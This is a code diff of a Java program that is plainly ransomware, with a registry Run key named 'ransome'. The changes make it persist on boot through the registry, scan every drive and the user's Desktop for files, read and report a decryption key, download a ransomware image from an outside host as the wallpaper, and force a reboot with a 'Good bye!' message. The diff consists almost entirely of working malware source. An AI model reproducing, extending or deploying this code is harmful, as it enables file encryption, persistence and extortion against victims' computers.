@@ -7,15 +7,12 @@ import java.io.IOException;
 import java.io.InputStreamReader;
 import java.lang.reflect.InvocationTargetException;
 import java.nio.file.FileSystems;
-import java.security.MessageDigest;
-import java.security.NoSuchAlgorithmException;
 import java.util.ArrayList;
 import java.util.Base64;
 import java.util.Random;
 import java.util.Scanner;
 
 import javax.swing.JOptionPane;
-import javax.xml.bind.DatatypeConverter;
 
 /**
  * @author Amirreza Marzban
@@ -27,7 +24,7 @@ import javax.xml.bind.DatatypeConverter;
 public class Main extends Core {
   private static int status;
 
-  public static void main(String[] args) {
+  public static void main(String[] args) throws IOException {
     JnaInstances.User32 user32 = JnaInstances.User32.INSTANCE;
     if (!new File("C:\\Users\\status").exists()) {
       createFile("C:\\Users\\status", 0);
@@ -39,6 +36,7 @@ public class Main extends Core {
         System.exit(1);
       }
       System.out.println("Installing the program...");
+      //run program in background
       user32.EnumWindows((hwnd, pointer) -> {
         char[] windowText = new char[512];
         user32.GetWindowTextW(hwnd, windowText, 512);
@@ -49,23 +47,14 @@ public class Main extends Core {
         }
         return true;
       }, null);
+//      Files.copy(Paths.get(System.getProperty("user.dir") + "\\setup.exe"),
+//        Paths.get(System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\setup.exe"), StandardCopyOption.REPLACE_EXISTING);
       findFiles();
-      System.exit(1);
+      writeInRegistry();
+    } else {
+      textArt();
+      findFiles();
     }
-    textArt();
-    findFiles();
-  }
-
-  public static String sha1(String input) {
-    String sha1 = null;
-    try {
-      MessageDigest msdDigest = MessageDigest.getInstance("SHA-1");
-      msdDigest.update(input.getBytes(), 0, input.length());
-      sha1 = DatatypeConverter.printHexBinary(msdDigest.digest());
-    } catch (NoSuchAlgorithmException e) {
-      e.printStackTrace();
-    }
-    return sha1;
   }
 
   /**
@@ -118,17 +107,17 @@ public class Main extends Core {
         WinRegistry.HKEY_CURRENT_USER,
         "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
         "ransome",
-        p + "\\setup.exe /onboot",
+        p + "\\setup.exe",
         1);
       FileDownloader.download("https://www.online-tech-tips.com/wp-content/uploads/2019/07/ransomware.jpeg", "C:\\Windows\\h.jpg", filePath -> {
+        //reset the computer with a message
         WinRegistry.writeStringValue(
           WinRegistry.HKEY_CURRENT_USER,
           "Control Panel\\Desktop",
           "Wallpaper",
           filePath,
           1);
-        //reset the computer with a message
-        runCommand("shutdown -r -c \"good bye..\"", null);
+        runCommand("shutdown -r -c \"Good bye!...\"", null);
       });
     } catch (IllegalAccessException e) {
       e.printStackTrace();
@@ -144,8 +133,7 @@ public class Main extends Core {
    */
   static ArrayList<String> findDrives() {
     ArrayList<String> arrayList = new ArrayList<>();
-//    String drives[] = {"F:"};
-    String drives[] = {"A:", "B:", System.getProperty("user.home") + "\\Desktop\\", "D:", "E:", "F:", "G:", "H:", "I:", "J:", "K:", "L:", "M:", "N:", "O:", "P:", "Q:", "R:", "S:", "T:", "U:", "V:", "W:", "X:", "Y:", "Z:"};
+    String drives[] = {"A:", "B:", "C:", "D:", "E:", "F:", "G:", "H:", "I:", "J:", "K:", "L:", "M:", "N:", "O:", "P:", "Q:", "R:", "S:", "T:", "U:", "V:", "W:", "X:", "Y:", "Z:"};
     for (String d : drives) {
       FileSystems.getDefault().getFileStores().forEach(root -> {
           if (root.toString().contains(d)) {
@@ -164,10 +152,13 @@ public class Main extends Core {
     try {
       Process runtime;
       for (String drive : findDrives()) {
+        if (drive.equals("C:")) {
+          drive = System.getProperty("user.home") + "\\Desktop";
+        }
         runtime = Runtime.getRuntime().exec("cmd /c dir /S /B *", null, new File(drive));
 
         BufferedReader inputStream = new BufferedReader(new InputStreamReader(runtime.getInputStream()));
-        String s = "";
+        String s;
         if (status == 1) {
           String decryptedKey = new String(Base64.getDecoder().decode(readFile("C:\\Users\\Keys")));
           Scanner scanner = new Scanner(System.in);
@@ -197,8 +188,6 @@ public class Main extends Core {
               "KEY: " + String.valueOf(key) + "\n" +
               "User: " + System.getProperty("user.home") + "\n" +
               "OS: " + System.getProperty("os.name"));
-          writeInRegistry();
-          System.exit(1);
         }
       }
     } catch (IOException e) {
